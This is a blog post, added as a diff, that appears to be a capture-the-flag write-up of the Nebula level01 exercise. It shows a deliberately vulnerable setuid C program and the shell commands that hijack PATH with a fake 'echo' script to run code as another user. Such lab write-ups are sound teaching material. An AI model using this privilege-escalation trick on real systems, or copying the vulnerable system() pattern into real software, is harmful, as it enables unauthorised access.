@@ -1,0 +1,88 @@
+---
+layout:     post
+title:      "Nebula 01"
+subtitle:   "Exploit Exercises Write-Up"
+date:       2017-06-07 0:00:00
+author:     "W3ndige"
+header-img: "img/nebula-header.jpg"
+permalink: /:title/
+category: "Exploit Exercises"
+---
+
+<h1>Introduction</h1>
+
+<p>Let's start another challenge from Nebula machine and see what's our target this time. </p>
+
+<h1>Challenge</h1>
+
+<p><b>About</b></p>
+
+<pre>
+There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+
+To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.
+</pre>
+
+<p><b>Code</b></p>
+
+{% highlight c %}
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("/usr/bin/env echo and now what?");
+}
+{% endhighlight %}
+
+<p><b>Solution</b></p>
+
+<p>Firstly, from the code, we know that <b>/usr/bin/env</b> will execute a program with the current enviroment. It includes a <b>$PATH</b> variable, which stores information where programs can be found. That way we can change the $PATH to some other folder, containing <b>echo</b> script. Then it will run the getflag program, just like in the previous level. </p>
+
+{% highlight bash %}
+level01@nebula:~$ cd /home/flag01
+level01@nebula:/home/flag01$ ls -l
+total 8
+-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
+{% endhighlight %}
+
+<p>In addition, setuid bit is set, so it will run as the owner <b>flag01</b>. Let's start from creating a tmp directory, which will be our fake one. </p>
+
+{% highlight bash %}
+level01@nebula:/home/flag01$ mkdir /tmp/level01
+{% endhighlight %}
+
+<p>Now we are able to create fake PATH using export command, and then create the fake echo program. </p>
+
+{% highlight bash %}
+level01@nebula:/home/flag01$ export PATH="/tmp/level01:$PATH"
+level01@nebula:/home/flag01$ echo "getflag" > /tmp/level01/echo
+{% endhighlight %}
+
+<p>Don't forget about the execute permissions. </p>
+
+{% highlight bash %}
+level01@nebula:/home/flag01$ chmod +x /tmp/level01/echo
+{% endhighlight %}
+
+<p>And we're ready to go, and run this vulnerable program. </p>
+
+{% highlight bash %}
+level01@nebula:/home/flag01$ ./flag01
+You have successfully executed getflag on a target account
+{% endhighlight %}
+
+<p>Another challenge completed! </p>
+
+<p>~ Stay safe! </p>
